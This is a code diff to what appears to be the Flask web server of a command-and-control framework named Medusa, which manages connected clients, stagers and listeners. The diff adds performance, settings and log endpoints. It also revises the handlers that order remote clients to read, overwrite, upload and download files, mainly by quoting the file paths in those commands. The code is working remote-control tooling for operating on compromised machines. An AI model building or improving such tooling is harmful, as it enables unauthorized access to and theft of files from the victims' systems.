@@ -16,6 +16,7 @@ import hashlib
 import threading
 import argparse
 import logging
+import psutil  # Added for system monitoring
 from datetime import datetime, timedelta
 from flask import Flask, render_template, request, jsonify, send_file, send_from_directory
 from flask_socketio import SocketIO, emit
@@ -46,6 +47,7 @@ tasks = {}
 stagers = {}
 server_running = True
 start_time = None
+performance_data = []  # Store performance history
 
 # Encryption setup
 def generate_key(password, salt):
@@ -663,6 +665,129 @@ def api_create_listener():
         logger.error(f"HTTP API listener creation failed: {e}")
         return jsonify({'success': False, 'error': str(e)}), 500
 
+def get_system_performance():
+    """Get current system performance metrics"""
+    try:
+        # CPU usage
+        cpu_percent = psutil.cpu_percent(interval=1)
+        
+        # Memory usage
+        memory = psutil.virtual_memory()
+        memory_percent = memory.percent
+        
+        # Network I/O
+        net_io = psutil.net_io_counters()
+        network_data = {
+            'bytes_sent': net_io.bytes_sent,
+            'bytes_recv': net_io.bytes_recv,
+            'packets_sent': net_io.packets_sent,
+            'packets_recv': net_io.packets_recv
+        }
+        
+        # Disk usage
+        disk = psutil.disk_usage('/')
+        disk_percent = (disk.used / disk.total) * 100
+        
+        return {
+            'cpu': cpu_percent,
+            'memory': memory_percent,
+            'disk': disk_percent,
+            'network': network_data,
+            'timestamp': datetime.now().isoformat()
+        }
+    except Exception as e:
+        logger.error(f"Error getting system performance: {e}")
+        return {
+            'cpu': 0,
+            'memory': 0,
+            'disk': 0,
+            'network': {},
+            'timestamp': datetime.now().isoformat()
+        }
+
+# Additional API Routes for Enhanced Features
+@app.route('/api/performance')
+def api_performance():
+    """Get current system performance metrics"""
+    perf_data = get_system_performance()
+    return jsonify(perf_data)
+
+@app.route('/api/performance/history')
+def api_performance_history():
+    """Get historical performance data"""
+    # Return last 60 data points (last 30 minutes if collected every 30 seconds)
+    return jsonify(performance_data[-60:] if len(performance_data) > 60 else performance_data)
+
+@app.route('/api/settings', methods=['GET', 'POST'])
+def api_settings():
+    """Get or update framework settings"""
+    settings_file = 'medusa_settings.json'
+    
+    if request.method == 'GET':
+        # Return current settings
+        if os.path.exists(settings_file):
+            try:
+                with open(settings_file, 'r') as f:
+                    settings = json.load(f)
+                return jsonify(settings)
+            except Exception as e:
+                logger.error(f"Error reading settings: {e}")
+                return jsonify({})
+        else:
+            # Return default settings
+            default_settings = {
+                'theme': {
+                    'primary': '#bd93f9',
+                    'accent': '#ff79c6',
+                    'success': '#50fa7b',
+                    'background': '#282a36'
+                },
+                'alerts': {
+                    'clientConnect': True,
+                    'clientDisconnect': True,
+                    'fileTransfer': True,
+                    'error': True
+                },
+                'logging': {
+                    'level': 'INFO',
+                    'retention': 7,
+                    'fileLogging': True
+                },
+                'analytics': {
+                    'enabled': True,
+                    'historicalData': True,
+                    'interval': 30
+                }
+            }
+            return jsonify(default_settings)
+    
+    elif request.method == 'POST':
+        # Update settings
+        try:
+            settings = request.get_json()
+            with open(settings_file, 'w') as f:
+                json.dump(settings, f, indent=2)
+            return jsonify({'success': True})
+        except Exception as e:
+            logger.error(f"Error saving settings: {e}")
+            return jsonify({'success': False, 'error': str(e)}), 500
+
+@app.route('/api/logs')
+def api_logs():
+    """Get recent log entries"""
+    log_file = 'medusa_server.log'
+    if os.path.exists(log_file):
+        try:
+            with open(log_file, 'r') as f:
+                lines = f.readlines()
+                # Return last 100 lines
+                return jsonify(lines[-100:] if len(lines) > 100 else lines)
+        except Exception as e:
+            logger.error(f"Error reading logs: {e}")
+            return jsonify([]), 500
+    else:
+        return jsonify([])
+
 # WebSocket Events
 @socketio.on('connect')
 def handle_connect():
@@ -761,8 +886,8 @@ def handle_get_file_content(data):
     
     client = clients[client_id]
     
-    # Send get content command
-    content_cmd = f"get_content {file_path}"
+    # Send get content command with proper path formatting
+    content_cmd = f"get_content \"{file_path}\""
     if client.send_command(content_cmd):
         emit('content_requested', {'client_id': client_id, 'file_path': file_path})
         logger.info(f"File content requested from {client_id}: {file_path}")
@@ -789,8 +914,8 @@ def handle_save_file(data):
     # Encode content as base64
     content_b64 = base64.b64encode(content.encode('utf-8')).decode('ascii')
     
-    # Send save content command
-    save_cmd = f"save_content {file_path} {content_b64}"
+    # Send save content command with proper path formatting
+    save_cmd = f"save_content \"{file_path}\" {content_b64}"
     if client.send_command(save_cmd):
         emit('file_saved', {'client_id': client_id, 'file_path': file_path})
         logger.info(f"File save requested to {client_id}: {file_path}")
@@ -815,14 +940,14 @@ def handle_upload_file(data):
     
     client = clients[client_id]
     
-    # Construct full file path
-    if upload_path.endswith('\\') or upload_path.endswith('/'):
-        file_path = f"{upload_path}{file_name}"
-    else:
+    # Construct full file path properly for Windows
+    if not upload_path.endswith('\\') and not upload_path.endswith('/'):
         file_path = f"{upload_path}\\{file_name}"
+    else:
+        file_path = f"{upload_path}{file_name}"
     
-    # Send upload command
-    upload_cmd = f"upload {file_path} {file_data}"
+    # Send upload command with proper formatting
+    upload_cmd = f"upload \"{file_path}\" {file_data}"
     if client.send_command(upload_cmd):
         emit('file_uploaded', {'client_id': client_id, 'file_path': file_path})
         logger.info(f"File upload requested to {client_id}: {file_path}")
@@ -845,8 +970,8 @@ def handle_download_file(data):
     
     client = clients[client_id]
     
-    # Send download command
-    download_cmd = f"download {file_path}"
+    # Send download command with proper path formatting
+    download_cmd = f"download \"{file_path}\""
     if client.send_command(download_cmd):
         emit('download_requested', {'client_id': client_id, 'file_path': file_path})
         logger.info(f"File download requested from {client_id}: {file_path}")
